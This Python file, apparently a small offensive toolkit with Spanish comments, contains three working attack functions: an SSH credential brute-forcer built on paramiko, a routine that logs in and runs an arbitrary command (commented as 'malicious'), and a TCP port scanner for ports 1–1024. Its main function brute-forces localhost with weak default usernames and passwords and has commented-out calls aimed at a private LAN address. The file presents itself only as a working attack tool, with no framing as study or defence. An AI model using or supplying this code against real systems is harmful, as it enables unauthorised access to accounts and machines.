# scripts/attack_patterns.py

import paramiko 
import socket
from colorama import Fore


### Brute force ssh credentials
def brute_force_attack(target_ip, target_port, username_list, password_list):
        for username in username_list:
            for password in password_list:
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(target_ip, port=target_port, username=username, password=password)    
                    print(f"{Fore.GREEN}[SUCCESS] {Fore.RESET}Successful login: {username}:{password}")
                    ssh_client.close()
                except paramiko.AuthenticationException:
                    print(f"{Fore.RED}[FAILED]{Fore.RESET} Authentication failed for {username}:{password}")
                except paramiko.SSHException as e:
                    print(f"{Fore.RED}[ERROR]{Fore.RESET} SSH error: {e}")


### Execute command when inside ssh
def execute_command(target_ip, target_port, username, password, command):
    try:
        # Establecer conexión SSH
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(target_ip, port=target_port, username=username, password=password)

        # Ejecutar comando malicioso
        stdin, stdout, stderr = ssh_client.exec_command(command)

        # Leer y mostrar la salida del comando
        output = stdout.read().decode("utf-8")
        print("Command executed:", command)
        print("Output:", output)

        # Cerrar la conexión SSH
        ssh_client.close()
    except paramiko.AuthenticationException:
        print("{Fore.RED}[ERROR]{Fore.RESET} Authentication: Username or password incorrect") 
    except paramiko.SSHException as e:
        print(f"{Fore.RED}[ERROR]{Fore.RESET} SSH: {e}")


### Scan open ports
def port_scan(target_ip):
    open_ports = []
    try:
        for port in range(1, 1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)  # Establece un tiempo de espera para la conexión
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"{Fore.GREEN}[OPEN]{Fore.RESET} Port {Fore.BLUE}{port}{Fore.RESET} is open.")
            sock.close()
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Fore.RESET} Error while scanning ports: {e}")
    return open_ports

def main():
	ul = ["root", "admin", "root"]
	pl = ["password","12345678"]
	brute_force_attack("localhost", "22", ul, pl)
	#port_scan("192.168.1.41")
	#execute_command("192.168.1.41", "22", "user", "password", "echo 'hola'")

if __name__ == "__main__":
    main()

